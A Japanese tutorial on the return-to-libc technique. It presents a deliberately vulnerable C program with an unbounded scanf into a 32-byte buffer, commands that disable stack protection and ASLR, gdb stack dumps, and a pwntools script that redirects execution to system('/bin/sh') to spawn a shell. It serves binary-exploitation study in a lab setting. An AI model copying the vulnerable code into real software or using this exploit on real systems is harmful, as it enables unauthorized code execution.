# Return to libc

プログラム本体のソースコードにかかれていない関数を呼び出す.

## sh コマンドと system 関数
sh コマンドでシェルを呼び出すことができる.  
シェルは OS の任意のコマンドを呼び出し実行することができる. 

C言語の system 関数から sh コマンドを呼び出すと、そのプログラムがシェルとして動作するようになる. system 関数から sh コマンドを実行させることで任意コード実行が可能になる.

## 攻撃対象
```c
#include <stdlib.h>
#include <stdio.h>

char global[] = "/bin/sh";

void vuln() {
    printf("global: %p\n", global);
    printf("please input a string");
    char overflowme[32];
    scanf("%[^\n]", overflowme);
}

int main() {
    vuln();
    printf("failed!\n");
    return 0;
}
```
コンパイルと下準備
```bash
$ gcc -fno-stack-protector -m32 sys02.c
$ sudo sysctl -wkernel.randomize_va_space=0
```
## system 関数の挙動
次のコードで確認.
```c
#include <stdlib.h>

int main() {
    system("/bin/ls");
    return 0;
}
```
system 関数を呼び出したときのスタック
```
[------------------------------------stack-------------------------------------]
0000| 0xffffd09c --> 0x565561fb (<main+46>:     add    esp,0x10)
0004| 0xffffd0a0 --> 0x56557008 ("/bin/ls")
0008| 0xffffd0a4 --> 0xffffd164 --> 0xffffd298 ("/home/hmiya/Coding/binary_analytics/return_to_libc01/a.out")
0012| 0xffffd0a8 --> 0xffffd16c --> 0xffffd2d3 ("SHELL=/bin/bash")
0016| 0xffffd0ac --> 0x565561e5 (<main+24>:     add    eax,0x2df3)
0020| 0xffffd0b0 --> 0xffffd0d0 --> 0x1
0024| 0xffffd0b4 --> 0x0
0028| 0xffffd0b8 --> 0x0
[------------------------------------------------------------------------------]
```
ret で呼び出したときに  
0000 (リターンアドレス) と 0004 (実行する system 命令) のスタックがあれば system が実行される.

## オーバーフローのイメージ図
```
1. オーバーフロー後のスタック
----------------- esp
...
-----------------
buffer = AAAA...
-----------------
...AAAA...
----------------- ebp
ret_addr -> system
-----------------
sys_ret_addr -> "BBBB"
-----------------
bin_sh_addr -> /bin/sh のアドレス
-----------------
...

2. mov esp, ebp
----------------- esp
buffer = AAAA...
-----------------
...AAAA...
----------------- 
...AAAA
----------------- ebp
ret_addr -> system
-----------------
sys_ret_addr -> "BBBB"
-----------------
bin_sh_addr -> /bin/sh のアドレス
-----------------
...

3. pop ebp
----------------- esp, ebp
ret_addr -> system
-----------------
sys_ret_addr -> "BBBB"
-----------------
bin_sh_addr -> /bin/sh のアドレス
-----------------
... 

4. ret ( = pop eip)
----------------- esp, ebp
ret_addr -> system
-----------------
sys_ret_addr -> "BBBB"
-----------------
bin_sh_addr -> /bin/sh のアドレス
-----------------
... 

5. system
----------------- esp
sys_ret_addr -> "BBBB"
-----------------
bin_sh_addr -> /bin/sh のアドレス
----------------- ebp
... 

```

## Return to libc に必要な要素
1. `vuln()` の `ret` アドレスを `system()` 開始アドレスにする.
2. `system()` が動作するようにスタックを書き換える.

## 具体的な作業
1. `$ p system` で `system()` の開始アドレスを得る.
2. `$ pattc 100` と `$ patto [str]` で `ret` 命令で `eip` に `pop` される `pattc` 文字列を特定 -> そこまでのオフセットを計算
3. `"/bin/sh"` のアドレスを取得
4. 攻撃コードを作成.

```py
from pwn import *

offset = 44
sys_addr = "\x20\xa4\xe1\xf7"
sys_ret_addr = "BBBB"
bin_sh_str_addr = "\x08\x90\x55\x56"

p = process("./a.out")
p.sendline("A"*offset+sys_addr+sys_ret_addr+bin_sh_str_addr)
p.interactive()
```